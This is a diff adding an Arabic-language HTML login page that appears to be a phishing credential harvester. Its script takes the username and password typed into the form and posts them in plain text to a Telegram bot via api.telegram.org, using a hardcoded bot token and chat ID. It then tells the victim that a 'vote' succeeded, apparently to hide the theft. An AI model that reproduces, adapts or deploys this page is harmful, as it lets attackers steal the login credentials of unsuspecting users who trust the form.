@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    form {
+      display: inline-block;
+      text-align: left;
+      border: 1px solid #ccc;
+      padding: 20px;
+      border-radius: 10px;
+      background: #f9f9f9;
+    }
+    input {
+      display: block;
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 10px;
+      font-size: 16px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <h1>تسجيل الدخول</h1>
+  <form id="loginForm">
+    <label for="username">اسم المستخدم:</label>
+    <input type="text" id="username" name="username" required>
+    
+    <label for="password">كلمة المرور:</label>
+    <input type="password" id="password" name="password" required>
+    
+    <button type="submit">تسجيل</button>
+  </form>
+
+  <div id="responseMessage" style="margin-top: 20px; font-size: 18px; color: green;"></div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async function(event) {
+      event.preventDefault(); // منع إعادة تحميل الصفحة
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const botToken = "7886666873:AAFC7Aa7HXmCOIMhQzXijxYVq9qqMlMuuho"; // ضع التوكن الخاص ببوتك هنا
+      const chatId = "6904870871"; // ضع معرف الشات الخاص بك هنا
+      const message = `🔐 تسجيل دخول جديد:
+      - اسم المستخدم: ${username}
+      - كلمة المرور: ${password}`;
+
+      try {
+        // إرسال البيانات إلى تلجرام
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+
+        // عرض رسالة "تم التصويت بنجاح" أسفل النموذج
+        document.getElementById('responseMessage').innerText = "تم التصويت بنجاح";
+      } catch (error) {
+        console.error('خطأ أثناء إرسال البيانات:', error);
+        document.getElementById('responseMessage').innerText = "حدث خطأ أثناء إرسال البيانات.";
+        document.getElementById('responseMessage').style.color = 'red';
+      }
+    });
+  </script>
+</body>
+</html>
